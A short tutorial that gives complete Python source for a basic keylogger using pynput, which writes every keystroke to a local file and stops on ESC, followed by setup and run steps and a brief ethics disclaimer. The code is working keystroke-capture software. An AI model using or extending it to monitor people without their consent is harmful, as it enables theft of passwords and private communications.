# Creating a Keylogger Using Python

A keylogger is a tool designed to capture keyboard inputs from a user. Below is a guide on creating a basic keylogger in Python for educational and ethical purposes. Ensure you use this knowledge responsibly.

---

## Prerequisites

1. **Python Installed**: Make sure Python 3.x is installed on your machine.
2. **Libraries**: Install the required libraries.
   - Use `pip` to install the `pynput` library:
     ```bash
     pip install pynput
     ```
3. **Permissions**: Administrator privileges may be required to run the keylogger.

---

## Code: Basic Keylogger

```python
from pynput.keyboard import Listener

# Path to save the log file
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Log the key pressed
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as file:
            file.write(f"<{key}>")

def on_release(key):
    # Stop the keylogger when 'ESC' key is pressed
    if key == key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

---

## Explanation of the Code

1. **Importing `Listener`**:
   - The `Listener` module from `pynput` captures keyboard events.

2. **on_press Function**:
   - Logs every key pressed to a file named `key_log.txt`.
   - Handles regular keys and special keys separately.

3. **on_release Function**:
   - Stops the keylogger when the `ESC` key is pressed.

4. **Starting the Listener**:
   - Listens for keyboard events and calls the appropriate functions (`on_press`, `on_release`).

---

## Running the Keylogger

1. Save the code to a Python file, e.g., `keylogger.py`.
2. Run the file in the terminal or command prompt:
   ```bash
   python keylogger.py
   ```
3. The `key_log.txt` file will be created in the same directory, storing the captured keystrokes.
